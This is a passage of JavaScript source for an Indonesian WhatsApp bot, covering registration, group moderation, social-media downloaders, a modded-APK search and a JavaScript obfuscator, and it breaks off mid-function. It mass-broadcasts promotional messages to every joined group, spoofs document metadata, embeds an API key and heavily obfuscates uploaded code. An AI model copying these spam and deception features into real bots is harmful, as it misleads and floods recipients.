if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Newmenu\`
  • .cadp
  • .cadp2
  • .topup
  • .pushjpm
  • .backup
  • .backup2(Ke Group Pv Anda)
  • .backup3(Start.js)
  • .backup4(Module)
  • .backup5(Sikima.js)
  • .backup6(Session.js)
  • .totalpanel(cekpanel)
  • .totaluser(cekuserpanel)
  • .totaladmin(cekadminpanel)
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delete': case 'del': {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'clsesi': case 'clearsession': {
if (!isCreator) return Reply(global.mess.owner)
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'unblok': {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "unblock");
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'sendtesti': case 'testi': {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await conn.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'play': {
    if (!isCreator) return Reply(mess.owner);
    if (args.length === 0) return conn.sendMessage(m.chat, { text: `🎶 Ketikkan nama lagu atau URL YouTube, misalnya:\n${prefix+command} dj kane` }, { quoted: m });
    
    const query = args.join(' ');

    try {
        const search = await yts(query);
        if (!search || search.all.length === 0) return conn.sendMessage(m.chat, { text: '🔍 Lagu yang Anda cari tidak ditemukan. Silakan coba lagi dengan kata kunci yang lebih tepat.' }, { quoted: m });

        const video = search.all[0];
        const detail = `🎥 *Youtube Audio Play*

*❖ Judul* : ${video.title}
*❖ Penonton* : ${video.views}
*❖ Pengarang* : ${video.author.name}
*❖ Diunggah* : ${video.ago}
*❖ URL* : ${video.url}

🔄 _Proses pengunduhan audio, harap tunggu..._`;

        await conn.sendMessage(m.chat, { text: detail }, { quoted: m });

        const format = 'mp3';
        const url = `https://p.oceansaver.in/ajax/download.php?format=${format}&url=${encodeURIComponent(video.url)}&api=dfcb6d76f2f6a9894gjkege8a4ab232222`;

        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        if (!response.data || !response.data.success) return conn.sendMessage(m.chat, { text: '❌ Gagal mengunduh audio. Coba lagi nanti.' }, { quoted: m });

        const { id, title, info } = response.data;
        const { image } = info;

        while (true) {
            const progress = await axios.get(`https://p.oceansaver.in/ajax/progress.php?id=${id}`, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            if (progress.data && progress.data.success && progress.data.progress === 1000) {
                const downloadUrl = progress.data.download_url;

                await conn.sendMessage(m.chat, {
                    audio: { url: downloadUrl },
                    mimetype: 'audio/mpeg',
                    fileName: `${title}.mp3`
                }, { quoted: m });

                await conn.sendMessage(m.chat, {
                    text: `🎧 Audio *${title}* telah berhasil diunduh dan siap untuk dinikmati! 🎶`
                }, { quoted: m });
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        console.error('Error:', error);
        conn.sendMessage(m.chat, { text: '⚠️ Terjadi kesalahan saat mencoba mengunduh audio. Mohon coba lagi nanti.' }, { quoted: m });
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'playvid': {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+res.url)

if (anu.download.video) {
let urlMp3 = anu.download.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'yts': {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ytmp3': {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

;

case 'daftar': {
    if (cekUser("id", m.sender) !== null) return Reply('Kamu sudah terdaftar !!');

    let input = args.join(" ").split("|"); // Format input: daftar Nama | Umur
    if (input.length < 2) return Reply("Format salah! Gunakan: *.daftar Nama | Umur*");

    let user_name = input[0].trim();
    let user_age = parseInt(input[1].trim());

    if (!user_name || isNaN(user_age) || user_age <= 0) {
        return Reply("Nama atau umur tidak valid! Gunakan: *.daftar Nama | Umur*");
    }

    var res_us = `${makeid(10)}`;
    let object_user = { 
        "id": m.sender, 
        "name": user_name, 
        "umur": user_age, 
        "seri": res_us, 
        "premium": false 
    };

    db_user.push(object_user);
    fs.writeFileSync('./src/user.json', JSON.stringify(db_user, null, 2));

    var verify_teks = `───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${m.sender.split('@')[0]}
○ Name : ${user_name}
○ Umur : ${user_age} Tahun
○ Seri : ${res_us}

Selamat, Anda telah terdaftar dan terverifikasi✅
Silakan ketik *.menu* untuk melihat fitur yang tersedia.

Bila tidak bisa, mohon maaf. script ini bersifat private 🙏`;

    Reply(verify_teks, [m.sender]);
}
break;

case 'adddaftar': {
    if (!isCreator) return Reply('Hanya Owner Utama yang dapat menambahkan pengguna secara manual!')

    let nomorPengguna = args[0]; // Ambil nomor pengguna dari perintah
    let userName = args[1]; // Ambil nama pengguna dari perintah
    let userAge = args[2]; // Ambil umur pengguna dari perintah

    if (!nomorPengguna) return Reply('Masukkan nomor pengguna yang ingin didaftarkan!\nContoh: *!adddaftar 6281234567890 Nama Umur*');
    if (!userName || !userAge) return Reply('Masukkan nama dan umur pengguna dengan benar!\nContoh: *!adddaftar 6281234567890 John 25*');
    
    // Validasi umur (harus angka dan lebih dari 0)
    userAge = parseInt(userAge);
    if (isNaN(userAge) || userAge <= 0) return Reply('Umur tidak valid! Pastikan umur menggunakan angka lebih dari 0.');

    let userID = nomorPengguna.includes('@s.whatsapp.net') ? nomorPengguna : `${nomorPengguna}@s.whatsapp.net`;

    if (cekUser("id", userID) !== null) return Reply('Pengguna ini sudah terdaftar!');

    var res_us = `${makeid(10)}`; // Membuat seri secara acak
    let object_user = { 
        "id": userID, 
        "name": userName, 
        "umur": userAge, 
        "seri": res_us, 
        "premium": false 
    };

    db_user.push(object_user);
    fs.writeFileSync('./src/user.json', JSON.stringify(db_user, null, 2));

    var verify_teks = `───「 𝗣𝗘𝗡𝗗𝗔𝗙𝗧𝗔𝗥𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」───

○ ID : @${userID.split('@')[0]}
○ Name : ${userName}
○ Umur : ${userAge} Tahun
○ Seri : ${res_us}

Pengguna telah berhasil ditambahkan secara manual oleh Owner ✅
Silakan ketik *.menu* untuk melihat fitur yang tersedia.`;

Reply(verify_teks, [userID]);
}
break;

case 'deldaftar': {
    if (!isCreator) return Reply('Hanya Owner Utama yang dapat menghapus pengguna secara manual!')

    let nomorPengguna = args[0]; // Ambil nomor pengguna dari perintah
    if (!nomorPengguna) return Reply('Masukkan nomor pengguna yang ingin dihapus!\nContoh: *!deldaftar 6281234567890*')

    let userID = nomorPengguna.includes('@s.whatsapp.net') ? nomorPengguna : `${nomorPengguna}@s.whatsapp.net`

    let index = db_user.findIndex(user => user.id === userID);
    if (index === -1) return Reply('Pengguna tidak ditemukan atau belum terdaftar!')

    // Menghapus pengguna dari database
    db_user.splice(index, 1);
    fs.writeFileSync('./src/user.json', JSON.stringify(db_user, null, 2)); // Simpan perubahan ke file

    var delete_teks = `───「 𝗣𝗘𝗡𝗚𝗛𝗔𝗣𝗨𝗦𝗔𝗡 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」───

○ ID : @${userID.split('@')[0]}

Pengguna telah berhasil dihapus dari database oleh Owner ❌`;

    // Mengirimkan notifikasi penghapusan kepada pengguna yang dihapus
    Reply(delete_teks, [userID]);
}
break;

case 'resetdaftar': {
    if (!isCreator) return Reply(mess.owner); // Pastikan hanya Owner yang bisa menjalankan perintah ini
    if (db_user.length === 0) return Reply('Tidak ada pengguna yang terdaftar.');

    // Menghapus semua pengguna dari database
    db_user.splice(0, db_user.length); 
    fs.writeFileSync('./src/user.json', JSON.stringify(db_user, null, 2)); // Menyimpan perubahan ke file

    Reply('✅ Semua data pengguna telah berhasil dihapus.');
}
break;

case 'listdaftar': {
    if (!isCreator) return Reply(mess.owner);
    if (!db_user || db_user.length === 0) return Reply('Belum ada pengguna yang terdaftar.');

    let daftar_users = '───「 LIST PENGGUNA TERDAFTAR 」───\n\n';
    db_user.forEach((user, index) => {
        daftar_users += `🔹 ${index + 1}.\n   🆔 ID: ${user.id}\n   🏷️ Name: ${user.name}\n   🎂 Umur: ${user.umur} Tahun\n   🔢 Seri: ${user.seri}\n   💎 Premium: ${user.premium ? '✅' : '❌'}\n\n`;
    });

    await conn.sendMessage(m.chat, {
        text: daftar_users,
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        buttons: [
            { buttonId: `.resetdaftar`, buttonText: { displayText: '🗑 Hapus Semua Pengguna' }, type: 1 },
            { buttonId: `.owner`, buttonText: { displayText: '📞 Hubungi Admin' }, type: 1 }
        ],
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
        }
    }, { quoted: m });
}
break;

case 'block': case 'blok': {
if (!isCreator) return Reply(mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ytmp4': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tiktokmp3': case "ttmp3": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'apkmod': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("capcut"))
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'instagram': case "igdl": case "ig": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'facebook': case "fb": case "fbdl": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'capcut': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'gitclone': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tiktok': case 'tt': {  
    if (!isCreator) return Reply(mess.owner);  
    if (!text) return m.reply(example("url"));  
    if (!text.startsWith("https://")) return m.reply(example("url"));  

    await tiktokDl(q).then(async (result) => {  
        if (!result.status) return m.reply("Error");  

        if (result.durations == 0 && result.duration == "0 Seconds") {  
            let araara = [];  
            let urutan = 0;  
            for (let a of result.data) {  
                let imgsc = await prepareWAMessageMedia({ image: { url: `${a.url}` } }, { upload: conn.waUploadToServer });  
                araara.push({  
                    header: proto.Message.InteractiveMessage.Header.fromObject({  
                        title: `Foto Slide Ke *${++urutan}*`,   
                        hasMediaAttachment: true,  
                        ...imgsc  
                    }),  
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({  
                        buttons: [{                    
                            "name": "cta_url",  
                            "buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`  
                        }]  
                    })  
                });  
            }  

            const msgii = await generateWAMessageFromContent(m.chat, {  
                viewOnceMessageV2Extension: {  
                    message: {  
                        messageContextInfo: {  
                            deviceListMetadata: {},  
                            deviceListMetadataVersion: 2  
                        },  
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({  
                            body: proto.Message.InteractiveMessage.Body.fromObject({  
                                text: "*Tiktok Downloader ✅*"  
                            }),  
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({  
                                cards: araara  
                            })  
                        })  
                    }  
                }  
            }, { userJid: m.sender, quoted: m });  

            await conn.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });  
        } else {  
            let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");  
            
            // Mengambil ukuran file dari response
            let videoSizeBytes = result.filesize || result.data[0]?.filesize;  
            
            if (!videoSizeBytes) {  
                try {  
                    let response = await fetch(urlVid.url, { method: 'HEAD' });  
                    videoSizeBytes = response.headers.get('content-length');  
                } catch (error) {  
                    console.error("Gagal mendapatkan ukuran file:", error);  
                }  
            }  

            let videoSizeMB = videoSizeBytes ? (videoSizeBytes / (1024 * 1024)).toFixed(2) : null;  
            let videoSizeText = videoSizeMB ? `${videoSizeMB} MB` : "Ukuran tidak diketahui";  

            // Menampilkan proses download dengan ukuran file
            await m.reply(`*Sedang mendownload...* \nUkuran file: ${videoSizeText}`);  

            await conn.sendMessage(m.chat, {  
                video: { url: urlVid.url },  
                mimetype: 'video/mp4',  
                caption: `*Tiktok Downloader ✅*\nUkuran: ${videoSizeText}\n\n_By 々 IjulTaka || 乂_`  
            }, { quoted: m });  
        }  
    }).catch(e => console.log(e));  
}  
break;
case 'tiktok2': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply(example("url"))
    if (!text.startsWith("https://")) return m.reply(example("url"))

    try {
        await tiktokDl(q).then(async (result) => {
            await conn.sendMessage(m.chat, { react: { text: '🕖', key: m.key } })

            if (!result.status) return m.reply("❌ Terjadi kesalahan saat mengunduh video.")

            // Jika durasi 0, berarti itu adalah gambar (slide)
            if (result.durations == 0 && result.duration == "0 Seconds") {
                let araara = []
                let urutan = 0

                for (let a of result.data) {
                    let imgsc = await prepareWAMessageMedia({ image: { url: `${a.url}` } }, { upload: conn.waUploadToServer })

                    araara.push({
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: `📷 Foto Slide Ke *${++urutan}*`,
                            hasMediaAttachment: true,
                            ...imgsc
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"🔗 Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                            }]
                        })
                    })
                }

                const msgii = await generateWAMessageFromContent(m.chat, {
                    viewOnceMessageV2Extension: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.fromObject({
                                    text: "📥 *Tiktok Downloader ✅*"
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: araara
                                })
                            })
                        }
                    }
                }, { userJid: m.sender, quoted: m })

                await conn.relayMessage(m.chat, msgii.message, {
                    messageId: msgii.key.id
                })
            } else {
                // Mencari video dengan kualitas terbaik (HD)
                let urlVid = result.data.find(e => e.type == "nowatermark_hd") || result.data.find(e => e.type == "nowatermark")

                if (!urlVid) return m.reply("❌ Video tidak ditemukan atau tidak dapat diunduh dalam kualitas HD.")

                await conn.sendMessage(m.chat, {
                    video: { url: urlVid.url },
                    mimetype: 'video/mp4',
                    caption: "📥 *Tiktok Downloader ✅*"
                }, { quoted: m })
            }
        }).catch(e => {
            console.log("Error:", e)
            m.reply("❌ Terjadi kesalahan saat mengunduh video/gambar dari TikTok.")
        })

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
    } catch (error) {
        console.error("Fatal Error:", error)
        m.reply("❌ Terjadi kesalahan tidak terduga.")
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ssweb': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await conn.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enc": case 'encrypt': {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript") return m.reply(example("dengan reply file .js"))
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'enchard': case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "高宝座DeltaChanXx齐Xz高宝座高" + 
            "高宝座DeltaChanXx齐Xz高宝座高";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

